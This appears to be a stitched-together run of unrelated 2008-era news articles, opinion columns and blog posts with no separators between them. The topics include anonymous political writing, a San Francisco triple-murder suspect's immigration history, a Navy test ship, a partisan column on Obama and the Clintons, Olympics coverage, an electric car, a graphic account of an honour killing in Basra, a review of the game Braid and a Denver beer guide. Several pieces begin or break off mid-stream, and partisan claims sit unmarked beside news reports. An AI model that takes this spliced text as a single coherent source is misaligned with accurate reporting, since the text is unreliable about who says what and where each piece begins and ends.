Whenever they shall grow weary of the existing government , they can exercise their constitutional right of amending it , or their revolutionary right to dismember or overthrow it .
But now we have come to the point at which even suggesting overthrowing the current government can land a loyal citizen who considers himself a patriot in prison for years .
And something as simple as writing an op - ed criticizing George W. can get you detained , harassed or worse .
Moreover , the idea that a person must sign his " Christian " name to his writings for their contents to be considered legitimate is hokum .
Whether I sign my article with my given name or another , the substance of the piece is still the same .
It contains the same facts and opinions , the same perspective , and the same purpose no matter the insignificant scribbling of a moniker that is attached to it .
Also , the writer who uses a pseudonym does the general public no injustice .
What does the public , most of whom have never and will never meet the author , care about whether it is " John Smith " or " Sandy Sand " who makes a good point about how much of a moron the president is ?
What is the benefit to Ed Tubbs to know that JC Garrett from East Texas wrote this piece ?
Would it not contain exactly the same words and meaning if it were signed " CG Jarrett " ?
The reader is not edified or sleighted in any way by the use of either .
The writer defrauds no one by keeping his legal identity and place of residence secret .
Why would it matter to Mr. Tubbs whether I typed ( actually , hunted - and - pecked ) this in Piscataway , New Jersey or Booger Holler , Arkansas ?
No , the main purpose of anonymity or pseudonymity when writing of dirty politics and corrupt government is to protect the writer from the government of which they write .
Another purpose is to reduce the chances of being ostracized by family , friends and neighbors for their views .
It does not render an author a coward to write anonymously or pseudonymously .
It means he is cautious and vigilant , knowing that the present government is not known for its toleration of dissent , and that the Vice President himself blew the identity of a covert agent in retaliation over an opinion piece written by her husband .
That 's not scared , that 's smart .
Perhaps Mr. Tubbs has not heard of Laura Berg , the nurse at a Veterans Affairs hospital who was threatened with a sedition investigation after writing a letter to the editor criticizing the Bush administration 's shameful handling of Hurricane Katrina and the Iraq war .
Yes , sedition : inciting rebellion against the government .
What terroristic , unpatriotic , treasonous words did Ms. Berg write that would trigger such a reaction ?
I am furious with the tragically misplaced priorities and criminal negligence of this government ... We need to wake up and get real here , and act forcefully to remove a government administration playing games of smoke and mirrors and vicious deceit .
That 's all it took to bring the full weight of the Bushie - infested government crashing down on her head .
The New York Times told the story this way :
Her superiors at the hospital soon alerted the Federal Bureau of Investigation and impounded her office computer , where she keeps the case files of war - scarred veterans she treats .
Then she received an official warning in which a Veterans Affairs investigator intoned that her letter “ potentially represents sedition . ”

The man charged with killing a father and two sons on a San Francisco street last month was one of the youths who benefited from the city 's long - standing practice of shielding illegal immigrant juveniles who committed felonies from possible deportation , The Chronicle has learned .
Edwin Ramos , now 21 , is being held on three counts of murder in the June 22 deaths of Tony Bologna , 48 , and his sons Michael , 20 , and Matthew , 16 .
They were shot near their home in the Excelsior district when Tony Bologna , driving home from a family picnic , briefly blocked the gunman 's car from completing a left turn down a narrow street , police say .
Ramos , a native of El Salvador whom prosecutors say is a member of a violent street gang , was found guilty of two felonies as a juvenile - a gang - related assault on a Muni passenger and the attempted robbery of a pregnant woman - according to authorities familiar with his background .
In neither instance did officials with the city 's Juvenile Probation Department alert federal immigration authorities , because it was the city agency 's policy not to consider immigration status when deciding how to deal with an offender .
Had city officials investigated , they would have found that Ramos lacked legal status to remain in the United States .
Federal authorities , however , also missed an opportunity to take Ramos into custody just this past March - after they had learned of his immigration status and started deportation proceedings , and after Ramos was arrested in San Francisco on a gun charge .
For reasons the federal agents cannot explain , they did not put an immigration hold on Ramos .
Raised in El Salvador
Juvenile justice authorities locally had a policy for at least a decade of not turning over illegal immigrant felons to the federal government , interpreting San Francisco 's self - proclaimed sanctuary - city status and state law as barring local officials from surrendering them for deportation .
Mayor Gavin Newsom rescinded that policy earlier this month after The Chronicle reported that the city had flown a number of youths out of the country on its own , in possible violation of federal law , and then housed some in unlocked group homes from which they quickly escaped .
Ramos came to the United States at age 13 from El Salvador , where he had been raised by his grandmother .
Authorities familiar with his background said Ramos wanted to be near his mother , who had abandoned him when he was 4 months old ; she was living with two of her other children in San Francisco .
According to records , his first contact with San Francisco police came Oct. 22 , 2003 , when officers were summoned to investigate an attack on a Muni bus at 21st and Mission streets .
Ramos , who had just turned 17 , had allegedly flashed gang signs and banged on the bus ' windows with two other gang members .
The three then yelled , " Who are you with ? " at a passenger , who responded that he did not belong to a gang , police said .
At that point , Ramos and the other two boarded the bus and beat and kicked the man , an attack that was recorded by the bus ' video camera , authorities said .
Ramos was taken to juvenile hall on charges of assault and participating in a street gang .
He was later convicted in juvenile court and was put in a shelter .
At that point , under federal law , Ramos could have been referred to the Immigration and Customs Enforcement agency .
But the Juvenile Probation Department 's policy for dealing with offenders stipulated that " probation officers shall not discriminate in any fashion against minors based on their immigration status . "
If the department made any inquiries into whether Ramos was a legal U.S. resident , it did not pass along its findings to the federal government .
New crime within days
On April 2 , 2004 , Ramos was released to the custody of his mother , but was still considered a ward of the court and was on probation .
Just four days later , records show , he committed another crime at 19th and Mission streets , two blocks from the site of the attack on the Muni passenger .
Records indicate that Ramos and two other men approached a pregnant woman from behind during the middle of the day , and that Ramos tried to yank away her backpack - style purse .
The woman 's brother was walking alongside and tried to stop the attack .
He pushed Ramos away , he later said , but Ramos punched him and fled .
The man found a police officer and pointed out Ramos nearby .
A month later , Ramos was convicted as a juvenile of attempted robbery , a felony , but cleared of assault .
Ramos was sent to Log Cabin Ranch , a city - run camp in the hills of the Peninsula , in June 2004 .
He was freed in February 2005 , this time to live with his mother 's sister .
Federal authorities finally learned that Ramos was n't a legal U.S. resident sometime after he turned 18 , when he applied for temporary residency status and was turned down .
The records are confidential , so the exact date of Ramos ' application is unclear , but ICE spokeswoman Virginia Kice said that once he was turned down , he would have been considered deportable .
By that time , however , Ramos had married a woman who is a U.S. citizen and applied again to immigration officials to stay in the United States , this time as a permanent resident .
That request was pending at the time Tony Bologna and his sons were shot to death .
Another break
In March , three months before the killings , Ramos was arrested in San Francisco after police pulled him over because his car had illegally tinted windows and no front license plate .
An alleged gang member in the car tried to discard a gun , but police recovered it and later concluded that it had been used in a double killing , authorities said .
The police report of the incident cited " numerous documented contacts " that officers had with Ramos and the man who allegedly discarded the gun , and said both were active members of the Mara Salvatrucha ( MS - 13 ) street gang .
San Francisco prosecutors , however , declined to file charges against Ramos , saying they could n't prove that he knew his companion had the gun .
When Ramos was arrested , sheriff 's deputies checked his immigration status on a national database and learned that he was considered deportable , immigration and sheriff 's officials say .
Eileen Hirst , chief of staff for Sheriff Michael Hennessey , said deputies had asked whether federal officials wanted to place a hold on Ramos so he could be taken into immigration custody .
" In our communication with ICE , they specifically told us they were not placing a detainer on him , " Hirst said .
" We cannot hold people in custody without a documented reason to hold them . "
Kice acknowledged that federal authorities had not asked for Ramos to be held .
She said she did not know why .
City now referring offenders
Since Newsom announced the city 's policy shift , San Francisco has referred at least 10 juvenile offenders to ICE for possible deportation proceedings .
In an interview Friday , Newsom declined to comment on Ramos ' history in San Francisco 's juvenile justice system , saying it would be wildly inappropriate to do so given the confidentiality of juvenile criminal records .
Newsom 's juvenile probation director , William Siffermann , inherited his agency 's policy of not turning over illegal immigrant juveniles for deportation when he took the job in early 2005 .
All of Ramos ' contacts with the city 's juvenile justice system took place before Siffermann came on board .
Siffermann said in an interview , " I am not going to confirm any of his prior dealings with our department .
I can't comment on what the implications were for our department when that decision was made .
That is part of what we 're reviewing . "
Ramos ' lawyer in the triple - murder case , Robert Amparan , did not address the issue of Ramos ' immigration status , saying only that there were several people who would vouch for his client 's character and good work in the community .
" I 've gotten several calls from community workers , educators and city service providers who know and work with Edwin , " Amparan said .
" They all expressed support and say they had never known him to be involved in anything like the allegations against him . "
What might not have been
Joseph Russoniello , the U.S. attorney for Northern California , said he welcomed the city 's re-examination of its policies related to how it handles illegal immigrant youths who commit felonies .
" A formula has to be found that accommodates the public 's right to be safe and the juvenile 's need to be protected , in many cases , from themselves , " Russoniello said .
" It is something that cries out for more attention than we 're giving it . "
As for the killings of the Bolognas , Russoniello said , " Is this something that could have been prevented ?
I do n't know . "
Danielle Bologna , however , said that if the government had done its job , the killings of her husband and two sons " would never have happened . "
" It was senseless , " she said .
" And to think they did n't deport him back , knowing that he did not have papers and he was here illegally , it is a big issue .
" They need to take responsibility , the city , " Bologna said .
" They did n't do anything .
...
He should have been deported .
This is huge .
I 'm extremely angry about this . "

Changes to the crew are nearly as revolutionary as the ship 's design .
The small Sea Fighter requires a crew of just 26 ( 16 Navy sailors and 10 Coast Guardsmen ) .
The crew is made up of five officers and 21 enlisted personnel .
With such a small crew , each member must be very knowledgeable of the ship and balance multiple duties .
" The thing that 's really unique about this crew is that since there 's only 26 of us , the engineers can't concentrate just on engineering and the navigators can't just concentrate on navigation , " said Navy Lt. Cmdr. Brandon Bryan .
" Everyone has to know everyone else 's business .
So my engineers know how to drive the ship , my guys who drive the ship know how to go down and start the diesel . "

The mix of Navy and Coast Guard crew will also provide a cross-section of expertise that can be used for various missions .
" I think the Navy brings their vast experience of operating in a Department of Defense environment , " said Coast Guard Chief Operations Specialist John Leary .
" And the Coast Guard will bring its unique international boarding authority that we have for international activities .
Plus , we have more experience manning ships with smaller crews . "
Inside the ship , the crew sleeps in three - man staterooms , a major difference from the large communal compartments on most naval ships .
The ship can also be configured to accommodate a crew of men and women .
While the Sea Fighter is a test vehicle , elements of it will be used in other future Navy and Coast Guard ships , including the larger Littoral Combat Ship and the Coast Guard 's Deepwater concept .
For more information on the Sea Fighter and related topics , check out the links on the next page .
I see this whole concept fitting in neatly with the idea some people have that kids should n't be playing video games to begin with .
Think about it .
By the time poor Timmy 's done charging his stuff , he 's way too exhausted to play any games .
The battery runs down while he 's gasping for breath .
It 's like some sick health video from the 50's .
" Ha ha .
Sorry son , guess you just can't play that fancy new thingamabob .
I guess you 've learned your lesson .

Hillary and Bill have hijacked the Denver convention , making it into a carbon copy of what it would have looked like had she won until the last possible moment .
By the time Obama gets up to speak and put his stamp on the convention , Hillary will have had one prime time night all to herself .
Bill will have pre-empted a second night .
Hillary will have had all the nominating and seconding speeches she wants .
And the roll call of the states would record , in graphic detail , how the voters of state after state rejected Obama ’s candidacy in the primaries .
Only then , after three and a half days of all Clinton all the time will the convention then , finally , turn to its nominee and allow him to have an hour in the sun !
And what leverage did the Clintons have to achieve all of this ?
None .
Hillary could not have taken the convention by storm and any show of party disunity would marginalize her forever in the Democratic Party .
Had she or her supporters tried to pull off distracting demonstrations or to recreate Lafayette Park in Chicago in 1968 , she would have paid a permanent price among the party faithful for sabotaging Obama ’s candidacy .
This Clintonian tour de force raises a key question about Barack Obama :
Is he strong enough to be president or can he be pushed around ?
His failure to stand up to the Clintons makes one wonder how effective he will be against bin Laden , Iran , Chavez , or Putin .
And now word emerges from the Obama camp that Indiana Senator Evan Bayh is on the short list for vice president .
To select Bayh would bring Obama ’s nemesis , Mark Penn , in through the campaign ’s back door .
Penn and Bayh are an item .
Mark ’s second ( and current ) wife , Nancy Jacobson was the key fund raiser for the Senator during his Senate campaigns .
Penn has always been Bayh ’s consultant and chief advisor .
Penn played the key role in 1996 in getting Bayh a slot as the convention keynote speaker .
Bayh has always marched to Mark Penn ’s tune .

This , of course , the same Mark Penn who structured the vilification of Barack Obama as a marginal American and orchestrated the campaign to summon the white working class in opposition to his candidacy .
How much will Obama take ?
His weakness if the face of the Clinton demands coupled with his refusal to debate McCain in the town forum meetings raise the question of whether he is tough when the teleprompter is turned off .
Why is he afraid or unwilling to do tough interviews ?
It is not enough for him to say that he is the front runner and ask why he should risk such confrontations .
In case he has n’t noticed , he ’s not the front runner .
The tracking polls all suggest a tied race where taking certain risks would be reasonable , unless his handlers worry about his vulnerability in difficult or extemporaneous situations .
Is an unscripted Obama a pushover ?
Will foreign leaders conclude that he is not up to the job , just as Khrushchev did with JFK at his 1961 Vienna summit that presaged the Cuban Missile crisis ?
If he does so poorly in negotiating with the Clintons , how will he do with the Russians ?

Half of Democrats Say Putting Hillary 's Name in Nomination Will Help Unify Party
Reason 1 . NBC Sucks !
Who needs another Olympic Games filled with America ’s self indulgent back patting , complete with fawning awe struck commentators .
Hey do n’t get me wrong , I like NBC , Katie Couric moving from The Today Show was upsetting and I still set my Blackberry to watch ER , I ’m just peeved at the blackout of clearly important races to me a Jamaican .
They were also races that were some of the most anticipated globally .
A fact missed by NBC executives it seem .
Reason 2 .
The insight , ideas and real world examples within the 14 trends unleashed in Seth Godin ’s new book Meatball Sundae , makes the idea of mainstream media owning exclusive rights to events like Olympics seemed , well , old school .
I ’ve been reading Seth ’s book Meatball Sundae during this Olympic Games season with green highlighter in hand and a neck brace on …insurance policy from all of the damn nodding in agreement that I did on the first read .
The book is a slap across the face , a double espresso kind of kick in the butt to us all .
Meatball Sundae – Is Your Marketing Out of Sync ? is the title of the book and really asks a rhetorical question .
What Seth says in 230 pages is , listen people many of you are going down the wrong path right now , things have changed .
Further , here are 14 trends you need to get familiar with , scream WTF and humbly go back to your drawing board .
Yeah , it ’s that kind of book .
Now , outside of the fact that I ’d love to gift this book to all the J Caribbean Brand and Marketing managers that have frustrated many of my colleagues and me over the past 10 years - h ow is this relevant to NBC ’s exclusive rights to the Olympics and why I ’m upset about that ?
The basic premise of the book is this .
How do companies , brands find their place and be successful in this digital age where customers are in control ; where technology is now in the hands of many ; where trends such as timeshifting ; do it yourself ; find it yourself loads of information , loads of choices is only growing .
That said .
Follow me to Page 23 … and warning I ’ll be taking snippets from paragraphs to make a sentence or a point .
On this page Godin says …. ” the way things are distributed … is changing ” .
On Page 30 …. “ aided by technology the world now acts smaller and works faster , ” … are you with me .
Ok , now go to page 71 and read about Trend number 2 - “ Amplification of the voice the consumer and independent authorities ” , it covers issues like Why Blogs Matter and Flipping the Funnel .
The other two trends to mull over are Trend number 8 – “ Infinite Channels of Communication ” ; Trend 10 “ The shifts in scarcity and abundance ” and one of the biggies , Trend number 14 - “ New Gatekeepers , No Gatekeepers ” .
Nope , I ’m saying no more go buy the book and spend a weekend with it and you ’ll see what I ’m talking about .
Back to the Olympics more directly .
Reason 3 . When I can get the video of the 100 m Men ’s Heats thanks to mobile video , the exclusive Caribbean rights holder CMC ( see we ’re doing not so smart things in the Caribbean too ) and the facility of YouTube – who needs to wait on NBC to show a delayed and ad riddled version of it .
One of the tenets of exclusivity in old school media ’s mind is that we , the consumers will only see it on their station at that set time .
The trend of time shifting is in full effect globally and throws this out the door .
Consumers want what they want when they want and how they want and they will have it no other way .
And the only reason why NBC and CMC have exclusive rights to the Olympics coverage it ’s because they banned cellphone cams , video cams at the Olympic venues .
Do n’t they know this is the age of the consumer being in control and no hanging on to exclusive media content contracts will stop that trend .
Reason 4 . Does anyone remember 1996 Olympics in Atlanta and how many televisions were slapped , smashed and thrown from balconies across the world because of the glaring , unapologetic , self indulgent coverage of American athletes even when they came 12th and 14th .
Reason 5 . Citizen Journalism is huge , growing fast and is unstoppable – through blogs , videoblogs , mobile videos , photos etc and I ’d love to see more of that for 2012 in London even though ironically , I plan to attend that one .
I ’d love to see how the United Kingdom Olympic committee could get the world ’s population more involved in the games - a sweet spot that has them as both spectators and participators .
The cheap , universal digital tools are already in place and the consumers who now rule are using them .
NB : I am looking forward to Tyson Gay eating the collective Jamaican dust of Asafa Powell and Usain Bold this week .
Go Jamaica !!
They can delay broadcast us but we ’re still the fastest nation in the world .
Argument done .

Mitsubishi is toying with the idea of bringing its jellybean - shaped i MiEV electric car to America and wants two California utilities to put them through their paces and see how they perform in real - world conditions .
The automaker has signed deals with Pacific Gas & Electric and Southern California Edison to add a few i MiEVs to their fleets in October .
The three - year demonstration program will test the vehicles ' drivetrains , reliability and usage on the grid .
It follows similar deals with utility companies in Japan , where the car hits the market next summer .
Tohru Hashimoto , a Mitsubishi executive in the i MiEV program , says its work with the two California utilities " will yield valuable data and a greater appreciation of the practicality of an all - electric vehicle in California . "
The four - seater , based on the " i " gasoline - powered cars Mitsubishi sells in Japan , is a little smaller than a Honda Fit .
It ditches the 64 - horsepower engine in favor of a 47 kW electric motor and 330 - volt lithium - ion battery .
The battery charges in about 10 to 16 hours plugged into a standard 110 volt electrical outlet like the ones in your house .
Plug it into a 220 and it'll charge in six to eight .
Although it does n't look like much , the motor produces an impressive 63 horsepower and 133 pound - feet of torque .
It 's said to be a quick and nimble runabout good for zero - to - 60 mph in less than 9 seconds and a top speed of 82 mph .
Mitsubishi says the i MiEV ( Mitsubishi Innovative Electric Vehicle ) is good for 75 miles on a charge and it wants to test the car in America to see how well a car designed for Japanese city driving does in America .
PG&E and SoCal Edison have loads of experience with EVs and plug - in hybrids ; SoCal Edison has racked up more than 16 million miles running the nation 's largest fleet of EVs .
" Partnering with automakers like Mitsubishi is vital to developing compatible infrastructures to support electric vehicles in the marketplace and ensure responsible integration with the grid , " says Andrew Tang , senior director of the smart energy web for PG&E .
" By working with Mitsubishi , we will both benefit from a free exchange of electric vehicle information that includes charging infrastructure availability , vehicle data , vehicle commercialization expectations and public feedback . "
Mitsubishi is n't the only automaker lining up with utilities to lay the groundwork for what some consider the inevitable electrification of the automobile .
Both Ford and General Motors are working with the Electric Power Research Institute – the R&D arm of the utility industry – to address issues ranging from tax incentives on what promise to be pricey cars to guaranteeing drivers can charge them easily without sparking a citywide blackout .
Mitsubishi plans to offer the i MiEV in Japan next summer for about $ 25,000 .
There 's no word on when it 's coming to the U.S. , but it 's worth noting the decision to offer them to Japanese buyers came shortly after Mitsubishi began working with seven major utilities .

Rand Abdel - Qader , 17 , told her closest friend that she was in love from the moment she set eyes on the young British soldier working alongside her in Basra , and she dreamed of a future with him .
It was an innocent infatuation but five months after Rand , a student of English at Basra University , met Paul , a 22 - year - old soldier posted to southern Iraq , she was dead .
She was stamped on , suffocated and stabbed by her father .
Several brutal knife wounds punctured her slender , bruised body - from her face to her feet .
He had done it , he proclaimed to the neighbours who soon gathered round , to ' cleanse his honour ' .
And as Rand was put into the ground , without ceremony , her uncles spat on her covered corpse because she had brought shame on the family .
Her crime was the worst they could possibly imagine - she had fallen in love with a British soldier and dared to talk to him in public .
Rand was murdered last month .
That the relationship was innocent was no defence .
She had been seen conversing intimately with Paul .
It was enough to condemn her , because he was British , a Christian , ' the invader ' , and the enemy .
The two met while he was helping to deliver relief aid to displaced families in the city and she was working as a volunteer .
They continued to meet through their relief work in the following months .
Rand last saw Paul in January , two months before her death .
It was only on 16 March that her father , Abdel - Qader Ali , learned of their friendship .
He was told by a friend , who worked closely with police , that Rand had been seen with Paul at one of the places they both worked as volunteers .
Enraged , he headed straight home to demand an explanation from his daughter .
' When he entered the house , his eyes were bloodshot and he was trembling , ' said Rand 's mother , Leila Hussein , tears streaming down her face as she recalled her daughter 's murder .
' I got worried and tried to speak to him but he headed straight for our daughter 's room and he started to yell at her . '
' He asked if it was true that she was having an affair with a British soldier .
She started to cry .
She was nervous and desperate .
He got hold of her hair and started thumping her again and again .
' I screamed and called out for her two brothers so they could get their father away from her .
But when he told them the reason , instead of saving her they helped him end her life , ' she said .
She said Ali used his feet to press down hard on his own daughter 's throat until she was suffocated .
Then he called for a knife and began to cut at her body .
All the time he was calling out that his honour was being cleansed .
' I just could n't stand it .
I fainted . ' recalled Leila .
' I woke up in a blur later with dozens of neighbours at home and the local police . '
According to Leila , her husband was initially arrested .
' But he was released two hours later because it was an " honour killing " .
And , unfortunately , that is something to be proud of for any Iraqi man . '
At the police station where the father was held Sergeant Ali Jabbar told The Observer last week : ' Not much can be done when we have an " honour killing " case .
You are in a Muslim society and women should live under religious laws .
' The father has very good contacts inside the Basra government and it was n't hard for him to be released and what he did to be forgotten .
Sorry but I can not say more about the case .'
Rand , considered impure , was given only a simple burial .
To show their repugnance at her alleged crime , her family cancelled the traditional mourner ceremony .
Two weeks after the murder , Leila left Ali .
She could no longer bear to live under the same roof as her daughter 's killer and asked for a divorce .
' I was beaten and had my arm broken by him , ' she said .
' No man can accept being left by a woman in Iraq .
But I would prefer to be killed than sleep in the same bed with a man who was able to do what he did to his own daughter , who , over the years , had only given him unconditional love . '
Now she works for a women 's organisation campaigning against honour killings .
' I just want to try to stop other girls having the same fate as my beloved Rand , ' said Leila who is forced to move regularly from friend to friend
A colleague of Leila 's said : ' We prefer to change places each two weeks to prevent targeting .
She has been threatened again by her husband 's family and is very scared . '
Throughout her friendship with Paul , Rand confided in only one person , her best friend Zeinab , 19 .
' She used to say that her charity work had more than one meaning now .
From the first time she saw him , she was helping needy families but also that Paul was helping her .
With just a simple , caring smile , he was able to give her the sense of love , making her forget all about the hard and depressing life in Iraq , ' said Zeinab .
The two teenagers had spent hours talking about him , ' she said .
' She loved to speak about his blond hair , his honey eyes , his white skin and the sweet way he had of speaking .
' He was very different from the local men who usually are tough and illiterate .
I was in heaven when she was speaking about him .
Everything looked so beautiful .
' But , I always had to remind Rand that she was a Muslim and her family was never going to accept her marrying a Christian , British soldier ' .
' Unfortunately she never wanted to hear me .
Her mind was very far from reality , but closer to an impossible dream . '
Paul gave Rand gifts .
She kept them - and him - secret from her family and asked Zeinab to take care of these small tokens of his affection for her .
He gave her a charming cuddly animal .
' She could n't take it home so she asked me to keep it for her , ' said Zeinab .
' It 's hard to look at it every day , ' she said .
Rand told Zeinab she and Paul had met only four times , though Zeinab doubts this .
Their meetings were always in public and through the voluntary work that Paul carried out as part of his regiment 's peacekeeping duties .
Rand had an excellent command of English and spoke it fluently and that , said Zeinab , allowed them to communicate freely without others around understanding what they were saying .
' She was the only one who could speak English and it made it easier for her to get closer " through words " to him , ' she said .
Soon Rand began giving different and elaborate excuses to her family to enable her to continue her voluntary work .
She persuaded her father that her work was vital in helping families .
And she began paying daily visits to displacement camps , local aid agencies and hospitals in the hope of bumping into Paul .
' He used to tell her all about England .
She told me his father had died from a disease and that it was a really sad story , ' said Zeinab .
' She liked to speak about how couples could live together in his country .
He told her that flowers could be found on every corner and he promised to take her one day to buy some in the streets of London .
She was a fan of London and he told her about all the tourists attractions there . '
' But the thing she used to like talking about best was how he praised her beauty and her intelligence .
She told me he called her " princess " . '
Despite knowing how dangerous the consequences of her actions could be , and the punishment she faced if caught , her passion for Paul grew stronger , said Zeinab .
' She never did anything more than talk to him .
She was proud to be a virgin and had a dream to give herself to the man she loved only after her marriage .
But she was seen as an animal , ' said Zeinab .
' What they did to her was ugly and pathetic .
Rand was just a young girl with romantic dreams .
She always kept her religion close to her heart .
She would never even hurt a petal on a rose . '
Last year 133 women were killed in Basra - 47 of them for so - called ' honour killings ' , according to the Basra Security Committee .
Out of those 47 cases there have been only three convictions for murder .
Since January this year , 36 women have been killed .
The British in Basra
· Unopposed British forces enter Basra , Iraq 's third largest city , on 21 March 2003 .
Residents welcome them .
· During the following weeks the outskirts of the city witness some of the heaviest fighting during the invasion of Iraq .
British forces led on foot by units of the 3rd Battalion The Parachute Regiment take city in early April .
· Hopes that warm smiles and berets - the campaign to win hearts and minds - would be sufficient soon dissipate as soldiers encounter fierce insurgency .
· Last September the last British troops withdraw from central Basra to airbase outside the city , with 168 service personnel , at that stage , having lost their lives trying to bring peace to the city .
· Three months later Britain formally hands control of Basra province over to the Iraqi authorities .
· British forces become directly involved in recent fighting in Basra , as clashes continue between the Iraqi army and militiamen of the Mahdi army .
· Four thousand British personnel will remain in Basra for the foreseeable future after the government announced last week it had abandoned plans to withdraw 1,500 troops from the city .
JibJab's Political Satire Cracks Up Campaign
A new online satire teases both presidential candidates .
July 16 , 2008  --
Though the presidential election may be months away , at JibJab studio in Los Angeles today , they 're celebrating .
JibJab creators , brothers Gregg and Evan Spiridellis have put their latest satire online .
" Right now , it 's everywhere .
I hate to say it , " Gregg said .
" I do n't want our servers to be slow , but we got some big equipment in that server farm , and it 's struggling to keep up . "
JibJab is best known for its video mocking President Bush and John Kerry during the 2004 presidential campaign to the tune of " This Land is Your Land . "
The Spiridellis brothers have brought that same brand of satire to the 2008 political race , skewering John McCain and Barack Obama equally .
In their " Time for Some Campaignin ' " video , sung to the tune of Bob Dylan 's " The Times They Are a Changing , " McCain rides on a tank , trying to run over Obama .
" McCain was easy , " Gregg said .
" Grizzled vet , definitely the hawk in the race , and then there was Obama .
We took our cue from Bill Clinton , who said Obama is a fantasy land . "
" A fairy tale , " Evan said , correcting his brother 's recollection of Clinton 's remarks .
Obama rides a unicorn through a magical forest , surrounded by gentle - looking deer and rabbits , calling for nonsensical change .
The video , which was nearly two months in the making , trots out some of the best characters from JibJab 's past successes .
President Bush begins the video calling out to " Condi , Scooter and Rove " to pack up the White House .
Clinton sings , " You were so close , my darlin ' , alas , no cigar ! " and Hillary Clinton responds by slamming a frying pan on his head .
" Our metrics for success is seeing liberal bloggers call us conservative and seeing conservative bloggers call us liberals , " Gregg said .
" As long as those two equations are balanced , we did our job . "
JibJab is giving Americans something to laugh about when the candidates ' flip - flopping and economic plans are taking center stage .
I finished Braid over the weekend .
It ’s a very hard game .
I say that because I could n’t play for more than 45 - 60 minutes at a time , without shutting off my Xbox in frustration .
If you read the official Braid walkthrough , which is in fact a statement by the author that you should not use a walkthrough , you are told :
Some of the puzzles will be hard .
But when you manage to solve those hard puzzles , you will feel very good about it .
The game will feel very rewarding .
and
All the puzzles can be solved .
Some of them might take an hour or two , but you will get it .
If you try .
And you will feel cool and smart .
It is true that when I did solve some of the harder puzzles , I did feel good about myself .
However , I found that it was all too fleeting ; 30 minutes of staring at the same screen for 1 minute of joy .
After giving it some thought , I have come to a very simple conclusion : I do n’t like hard games .
Allow me to backpedal a bit : Braid is a beautiful game .
It is evident that it is the product of people who cared deeply about what they were working on .
I ca n’t help but think that everything about it is deliberate , down to every last pixel , if such a thing is even possible .
Its difficulty is not an accident of game design — it is meant to be that way .
Everything I have read from its creator , Jonathan Blow , supports this .
In an interview with Matthew Boyd , he says :
What I do is make the games that I need to make , because I wo n’t be satisfied with my life if I do n’t make them .
This does n’t necessarily have that much to do with the audience .
If my audience were to turn out to be very small , I would be bummed , but I would n’t change the games I am making in order to gain a bigger audience , because then what ’s the point ?
I would not be making what I think needs to be made .
So when I say that Braid ’s difficulty affected my overall level of enjoyment , I am not faulting its game design .
In fact , I believe it has been superbly crafted and that its game design should be applauded : it is simply not the game for me .
Challenges
All games are presented as a series of challenges that must be overcome .
The challenge might be to protect your city from invasion , or to beat the final boss of a dungeon , or beat a qualifying lap time , but they are challenges nonetheless .
Sometimes the challenge of the game is to figure out how to play the game .
A great example of this is Dwarf Fortress , whose motto is “ Losing is Fun ! ”
It is true that there are some pieces of software that are interactive and do not ( strictly ) rely on challenges , for example the excellent Galatea by Emily Short .
In this article , I am talking about the majority of software released as “ games ” into the video game and computer market in a given year .
Without any sort of challenge , the typical player will be bored .
Most avid gamers have probably encountered a game that they find “ too easy . ”
It is a wholly unsatisfying experience to the player .
On the other hand , if the challenge is too great , the player might want to quit in frustration .
This is probably something that we have all experienced when trying to introduce a friend who does n’t play video games to a new game that we love : they are upset by their inability to keep up and want to stop playing .
It is worth noting that in the official Braid walkthrough I linked to above , the player is told “ Do n’t give up ” twice !
Rewards
Most of the time , when a player defeats a challenge , they are rewarded for it .
The reward is often access to new areas of the game , or an additional piece of the storyline or a new form of gameplay .
In older games , when memory was limited , sometimes the only reward you got was a score and bragging rights on a scoreboard .
In Dwarf Fortress , the reward is that you are playing longer than you have before , and have access to new features in your fortress .
In Braid , you are rewarded with access to new areas , completed puzzles and more of the disjointed storyline , but arguably the main reward is the feeling of “ cool and smart ” that you get from completing a puzzle .
There is a class of gamer who loves being challenged .
They are the ones who repeat games on ‘ Hard Mode ’ and who play the same sequence of a game repeatedly in order to best their previous times or scores .
I think of them as a sort of athlete , who play an established challenge on a level playing field against others , pushing their response times and dexterity to their limits .
They love their challenges when they ’re hard .
There is another class of gamer who is n’t crazy about being challenged , although they can stand a little .
I think of them as the explorers : they ’re the ones who play a game primarily to experience what is up ahead .
They love seeing the new environments and gameplay mechanics , and are the first to go to read a walkthrough if they get stuck at a certain spot for an hour or more .
Now of course , like any other classification of personalities , there are people who fit into both categories .
Some like being challenged and adore exploration .
It ’s likely that every hard core game has a bit from both categories .
Why I do n’t like hard games
I have realized slowly over the last few years that I am more of an explorer than an athlete .
To me , the most amazing thing about Braid was its pitch - perfect design .
I ca n’t think of another game I ’ve played this year that made my jaw drop the second I started playing it .
However , I found the puzzles too frustrating .
The challenge level was set up much too high for me , and I was more interested in exploring the worlds than I was solving every last puzzle piece .
Realizing that I do n’t enjoy hard challenges has been a huge discovery for me , both as a gamer and as a game designer .
I think this is reflected in Forumwarz .
Over time I have done my best to fine - tune the gameplay to eliminate the major places where existing players get stuck .
That ’s one of the huge advantages of web - based games — you can deploy changes practically at any time .
For me , the major goal of Forumwarz , like many other RPGs , is to give the player a new world to interact with .
As they delve deeper into the universe , they meet unique personalities
and experience cool environments .
Playing as a different character class is more about experiencing the same environments in a different way than changing the difficulty level .
We even offer players who are n’t concerned with the RPG gameplay to “ cheat ” , and basically experience the story in one ( long ) sitting .
Having said that , we do have athlete - oriented challenges .
We ’ve got our speedruns , and rewards for people who beat forums that are above their level .
But the main design focus of Forumwarz is to provide an environment that the majority of players can enter easily and start enjoying themselves .
Whether you ’re a game designer or just a game player , I think it ’s a good exercise to determine what levels of challenges you enjoy in your gaming .
Where do you fit in ?
Colorado has , over the past 15 years or so , established itself as a genuine microbrew mecca , and just about every place you walk into either makes their own or is serving up something produced by one of our many local breweries .
We host the Great American Beer Festival every fall , and while we tip our caps to all the great micros in other places around the country , most of us around here are convinced that Denver is the best city for beer in the country .
Before I dive in , let me offer a caveat .
I love beer and have tasted just about everything I ’m going to mention below ( and a lot more ) , but I have my blind spots .
I ’m all about the malts and aside from wheats in the warm months I rarely drink anything lighter than an amber .
If you ’re a hophead or love things like blondes and pilsners , I ’m not an ideal source of wisdom .
So , a couple suggestions .
First , ask the bartender and request a taster when you see something that looks to have potential .
Second , we recommend you investigate what Beer Advocate has to say .
They have reviews for just about every beer in the world and those reviewers are serious brews connoisseurs .
Now , pull up a stool .
Places to Go
There ’s no way to do justice to all of our brewers and pubs , but let ’s point DNC visitors toward some of the better tasting opportunities around town .
